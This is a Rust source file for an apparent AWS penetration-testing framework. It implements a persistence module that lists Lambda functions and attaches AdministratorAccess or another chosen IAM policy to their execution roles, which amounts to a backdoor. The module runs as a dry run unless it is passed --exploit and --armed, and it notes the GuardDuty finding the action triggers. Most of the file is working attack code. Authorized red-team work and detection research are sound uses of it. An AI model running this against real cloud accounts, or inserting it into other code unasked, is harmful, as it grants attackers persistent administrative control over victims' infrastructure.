//! lambda__backdoor_new_roles — attach admin-level IAM policies to Lambda execution roles.
//!
//! Category: PERSIST. Requires --armed for write operations.
//!
//! Concept: For each targeted Lambda function's execution role, check whether
//! it already has admin-level policies. In exploit mode (--exploit + --armed),
//! attach AdministratorAccess to the execution role.
//!
//! Args:
//!   --function-name <name>   target a specific Lambda function's role
//!   --all                    target all Lambda execution roles from session cache
//!   --exploit                actually attach the policy (requires --armed)
//!   --policy-arn <arn>       policy to attach (default: arn:aws:iam::aws:policy/AdministratorAccess)
//!
//! Detection: AttachRolePolicy on Lambda execution role — triggers
//! GuardDuty Persistence:IAMUser/UserPermissions

use anyhow::Context as _;
use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

const DEFAULT_POLICY_ARN: &str = "arn:aws:iam::aws:policy/AdministratorAccess";
const ADMIN_POLICY_ARNS: &[&str] = &[
    "arn:aws:iam::aws:policy/AdministratorAccess",
    "arn:aws:iam::aws:policy/PowerUserAccess",
];

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let function_name: Option<&str> = {
        let pos = args.iter().position(|&a| a == "--function-name");
        pos.and_then(|i| args.get(i + 1).copied())
    };

    let target_all = args.contains(&"--all");
    let exploit = args.contains(&"--exploit");

    let policy_arn: &str = {
        let pos = args.iter().position(|&a| a == "--policy-arn");
        pos.and_then(|i| args.get(i + 1).copied())
            .unwrap_or(DEFAULT_POLICY_ARN)
    };

    // Must specify at least one target
    if function_name.is_none() && !target_all {
        anyhow::bail!(
            "Must specify a target: --function-name <name> or --all"
        );
    }

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    println!(
        "{}",
        "lambda__backdoor_new_roles".cyan().bold()
    );
    println!(
        "  Policy to attach: {}",
        policy_arn.yellow()
    );
    println!(
        "  Detection: AttachRolePolicy on Lambda execution role — GuardDuty Persistence:IAMUser/UserPermissions\n"
    );

    // ── Collect target functions ───────────────────────────────────────────
    let lambda = aws_sdk_lambda::Client::new(&ctx.sdk_config);

    // Build list of (function_name, role_arn) pairs
    let mut targets: Vec<(String, String)> = Vec::new();

    if target_all {
        // Enumerate all functions
        let mut marker: Option<String> = None;
        loop {
            let mut req = lambda.list_functions();
            if let Some(ref m) = marker {
                req = req.marker(m);
            }
            let page = req
                .send()
                .await
                .context("lambda:ListFunctions failed")?;

            for f in page.functions() {
                let name = f.function_name().unwrap_or("<unknown>").to_owned();
                let role = f.role().unwrap_or("<unknown>").to_owned();
                targets.push((name, role));
            }

            match page.next_marker() {
                Some(m) => marker = Some(m.to_owned()),
                None => break,
            }
        }
    } else if let Some(fn_name) = function_name {
        // Get single function's role
        let resp = lambda
            .get_function_configuration()
            .function_name(fn_name)
            .send()
            .await
            .context("lambda:GetFunctionConfiguration failed")?;

        let role = resp.role().unwrap_or("<unknown>").to_owned();
        targets.push((fn_name.to_owned(), role));
    }

    if targets.is_empty() {
        println!("{}", "No Lambda functions found.".yellow());
        return Ok(());
    }

    println!(
        "  Found {} target function(s):\n",
        targets.len().to_string().green().bold()
    );

    let iam = aws_sdk_iam::Client::new(&ctx.sdk_config);

    for (fn_name, role_arn) in &targets {
        // Extract role name from ARN (last segment after /)
        let role_name = role_arn
            .rsplit('/')
            .next()
            .unwrap_or(role_arn.as_str());

        println!("  Function: {}", fn_name.yellow());
        println!("  Role ARN: {}", role_arn.cyan());

        // Check existing policies
        let has_admin = check_role_has_admin(&iam, role_name).await;

        match has_admin {
            Ok(true) => {
                println!(
                    "  {} Role already has admin-level policy attached.",
                    "[INFO]".green()
                );
            }
            Ok(false) => {
                println!(
                    "  {} Role does NOT have admin-level policy attached.",
                    "[FINDING]".yellow()
                );
            }
            Err(e) => {
                eprintln!(
                    "  {} Could not check role policies: {e}",
                    "[WARN]".yellow()
                );
            }
        }

        if !exploit {
            println!(
                "  {} Would call: iam:AttachRolePolicy on role '{}' with policy '{}'",
                "[DRY-RUN]".cyan(),
                role_name,
                policy_arn
            );
        } else {
            // Armed + exploit — perform the attach
            println!(
                "  {} Calling iam:AttachRolePolicy on role '{}'...",
                "[EXEC]".red().bold(),
                role_name
            );
            match iam
                .attach_role_policy()
                .role_name(role_name)
                .policy_arn(policy_arn)
                .send()
                .await
            {
                Ok(_) => println!(
                    "  {} Policy '{}' attached to role '{}'.",
                    "[OK]".green().bold(),
                    policy_arn,
                    role_name
                ),
                Err(e) => eprintln!(
                    "  {} AttachRolePolicy failed for '{}': {e}",
                    "[ERROR]".red(),
                    role_name
                ),
            }
        }

        println!();
    }

    if !exploit {
        println!(
            "{}",
            "Run with --exploit --armed to perform the actual AttachRolePolicy calls.".yellow()
        );
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Helper: check whether a role already has any admin-level managed policy
// ---------------------------------------------------------------------------

async fn check_role_has_admin(
    iam: &aws_sdk_iam::Client,
    role_name: &str,
) -> anyhow::Result<bool> {
    let resp = iam
        .list_attached_role_policies()
        .role_name(role_name)
        .send()
        .await
        .context("iam:ListAttachedRolePolicies failed")?;

    for policy in resp.attached_policies() {
        if let Some(arn) = policy.policy_arn() {
            if ADMIN_POLICY_ARNS.contains(&arn) {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "lambda__backdoor_new_roles",
            author: "lancer-pacu",
            category: "PERSIST",
            one_liner: "Attach admin-level IAM policies to Lambda execution roles. Requires --armed + --exploit.",
            services: &["Lambda", "IAM"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "lambda__backdoor_new_roles");
        assert!(found, "lambda__backdoor_new_roles not found in inventory");
    }

    #[test]
    fn module_category_is_persist() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "lambda__backdoor_new_roles")
            .expect("lambda__backdoor_new_roles not found");
        assert_eq!(m.info.category, "PERSIST");
    }

    #[tokio::test]
    async fn missing_target_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // Neither --function-name nor --all provided
        let result = super::run(&ctx, &[]).await;
        assert!(result.is_err(), "expected error when no target is specified");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--function-name") || msg.contains("--all"),
            "error should mention --function-name or --all: {msg}"
        );
    }
}
